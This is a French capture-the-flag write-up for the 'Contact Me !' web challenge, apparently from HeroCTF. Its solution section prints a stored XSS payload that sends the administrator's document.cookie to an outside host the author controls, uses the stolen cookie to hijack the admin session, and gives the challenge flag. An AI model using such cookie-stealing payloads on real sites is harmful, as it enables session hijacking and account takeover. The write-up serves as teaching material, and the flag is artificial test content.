# Contact Me !

### Catégorie

Web

### Description

Un petit développeur a mis en place un serveur où vous pouvez le contacter.
Malheureusement, une des pages n'est pas accessible, et j'ai vraiment envie de savoir ce qu'elle cache... Vous pouvez le faire pour moi ?

http://challs.heroctf.fr:3010/

Format : Hero{flag}

### Auteur

Worty

### Solution

On arrive sur une page qui nous propose de laisser un commentaire à l'administrateur pour qu'il le lise plus tard.<br/>
Pourquoi pas tenter d'afficher une alerte javascript pour voir si une XSS est possible ?

Payload : <script>alert(1);</script><br/>
Quand la page se réactualise, l'alert s'affiche, il s'agit bien ici d'une faille XSS!

Le but du challenge est de pouvoir accéder à la page /admin.php, il va donc falloir voler le cookie de session de l'administrateur.<br/>
Pour se faire, nous allons redirigé l'administrateur vers notre serveur et lui faire écrire ses cookies dans un fichier de log que nous pourrons consulter.<br>

Payload : <script>document.location.href="https://worty.alwaysdata.net/cookies.php?c="+document.cookie</script><br/>
Personnellement, je passe par PHP pour écrire le cookie de l'administrateur, le contenu de mon script se trouve dans le fichier cookies.php de ce répertoire git.<br/>

Une fois que l'admin est passé sur notre lien, on récupère son cookie de session.<br/>
Rendez vous sur http://challs.heroctf.fr:3010/admin.php , je change mon cookie de session par celui de l'administrateur, j'actualise !

### Flag

Hero{b3_c4r3ful_w1th_xss_!!}